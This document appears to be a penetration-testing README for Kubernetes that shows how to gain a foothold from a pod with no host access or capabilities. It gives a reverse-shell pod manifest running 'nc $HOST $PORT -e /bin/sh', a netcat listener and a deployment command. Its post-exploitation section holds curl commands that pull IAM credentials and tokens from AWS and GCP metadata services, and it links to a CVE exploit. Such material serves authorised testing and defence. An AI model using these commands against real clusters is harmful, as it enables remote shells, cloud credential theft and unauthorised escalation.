## You have nothing

The pod security policy or admission controller has blocked access to all of the host's namespaces and restricted all capabilities.  **Do not despair**, especially if the target cluster is running in a cloud environment. 


# Pod Creation

## Create a pod you can exec into
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod-nothing-allowed
  labels: 
    app: pentest
spec:
  containers:
  - name: nothing-allowed
    image: ubuntu
    command: [ "/bin/bash", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name
  ```
[nothing-allowed.yaml](nothing-allowed.yaml)

#### Option 1: Create pod from local yaml 
```bash
kubectl apply -f nothing-allowed.yaml 
```

#### Option 2: Create pod from github hosted yaml
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/nothing-allowed/nothing-allowed.yaml 
```

#### Exec into pod 
```bash
kubectl exec -it pod-nothing-allowed -- bash
```

## Or, create a reverse shell pod
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod-nothing-allowed-revshell
  labels: 
    app: pentest
spec:
  containers:
  - name: nothing-allowed-revshell
    image: busybox
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name
  restartPolicy: Always  
  ```
[nothing-allowed-revshell.yaml](nothing-allowed-revshell.yaml)

#### Set up listener
```bash
nc -nvlp 3116
```

#### Create the pod
```bash
# Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/nothing-allowed/nothing-allowed-revshell.yaml | kubectl apply -f -
```

#### Catch the shell and chroot to /host 
```bash
~ nc -nvlp 3116
Listening on 0.0.0.0 3116
Connection received on 10.0.0.162 42035
```

# Post exploitation

* **Cloud metadata** - If cloud hosted, try to access the cloud metadata service. You might get access to the IAM credentials associated with the node, or even just a cloud IAM credential created specifically for that pod. In either case, this can be your path to escalate within the cluster, within the cloud environment, or both. 

```bash
curl http://169.254.169.254/latest/user-data # aws
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME] #aws
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/[account]/default/token #gcp
```

* **Overly permissive service account** - If the default service account is mounted to your pod and is overly permissive, you can use that token to further escalate your privs within the cluster.
* **Anonymous-auth** - If either [the apiserver or the kubelets have anonymous-auth set to true](https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet/), and there are no network policy controls preventing it, you can interact with them directly without authentication. 
* **Exploits** - Is the kubernetes version vulnerable to an exploit, i.e. [CVE-2020-8558](https://github.com/tabbysable/POC-2020-8558)
* **Traditional vulnerability hunting** -Your pod will be able to see a different view of the network services running within the cluster than you likely can see from the machine you used to create the pod. You can hunt for vulnerable services by proxying your traffic through the pod. 




# Reference(s): 

* https://securekubernetes.com/
* https://madhuakula.com/kubernetes-goat/
* https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet/
* https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/
* https://github.com/tabbysable/POC-2020-8558